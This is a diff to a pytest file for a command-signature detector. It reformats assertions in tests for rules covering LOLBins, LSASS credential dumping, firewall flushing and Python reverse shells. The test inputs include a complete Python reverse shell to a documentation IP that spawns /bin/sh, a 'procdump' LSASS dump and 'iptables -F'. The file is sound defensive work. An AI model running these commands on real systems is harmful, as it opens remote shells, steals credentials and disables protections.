@@ -71,9 +71,8 @@ class TestUntestedHandWrittenRules:
     ])
     def test_lolbin_windows_rule(self, cmd):
         v = check_signature(cmd)
-        assert v.matched and v.rule_id == "lolbin-windows", (
-            f"{cmd!r} -> {v.rule_id!r}"
-        )
+        assert v.matched, f"{cmd!r}: expected matched=True, got rule_id={v.rule_id!r}"
+        assert v.rule_id == "lolbin-windows", f"{cmd!r}: matched but rule_id={v.rule_id!r}"
 
     @pytest.mark.parametrize("cmd", [
         "procdump -ma lsass.exe lsass.dmp",
@@ -82,9 +81,8 @@ class TestUntestedHandWrittenRules:
     ])
     def test_cred_lsass_rule(self, cmd):
         v = check_signature(cmd)
-        assert v.matched and v.rule_id == "cred-lsass", (
-            f"{cmd!r} -> {v.rule_id!r}"
-        )
+        assert v.matched, f"{cmd!r}: expected matched=True, got rule_id={v.rule_id!r}"
+        assert v.rule_id == "cred-lsass", f"{cmd!r}: matched but rule_id={v.rule_id!r}"
 
     @pytest.mark.parametrize("cmd", [
         "iptables -F",
@@ -93,24 +91,26 @@ class TestUntestedHandWrittenRules:
     ])
     def test_evasion_firewall_rule(self, cmd):
         v = check_signature(cmd)
-        assert v.matched and v.rule_id == "evasion-firewall", (
-            f"{cmd!r} -> {v.rule_id!r}"
-        )
+        assert v.matched, f"{cmd!r}: expected matched=True, got rule_id={v.rule_id!r}"
+        assert v.rule_id == "evasion-firewall", f"{cmd!r}: matched but rule_id={v.rule_id!r}"
 
     @pytest.mark.parametrize("cmd", [
-        "python -c 'import socket,os,pty;"
-        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-        "s.connect((\"198.51.100.1\",4444));"
-        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-        "pty.spawn(\"/bin/sh\")'",
-        "python3 -c \"import socket,os; s=socket.socket(); "
-        "s.connect(('attacker',1337)); os.dup2(s.fileno(),0)\"",
+        (
+            "python -c 'import socket,os,pty;"
+            + "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+            + "s.connect((\"198.51.100.1\",4444));"
+            + "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+            + "pty.spawn(\"/bin/sh\")'"
+        ),
+        (
+            "python3 -c \"import socket,os; s=socket.socket(); "
+            + "s.connect(('attacker',1337)); os.dup2(s.fileno(),0)\""
+        ),
     ])
     def test_revshell_python_rule(self, cmd):
         v = check_signature(cmd)
-        assert v.matched and v.rule_id == "revshell-python", (
-            f"{cmd!r} -> {v.rule_id!r}"
-        )
+        assert v.matched, f"{cmd!r}: expected matched=True, got rule_id={v.rule_id!r}"
+        assert v.rule_id == "revshell-python", f"{cmd!r}: matched but rule_id={v.rule_id!r}"
 
 
 # ---------------------------------------------------------------------------
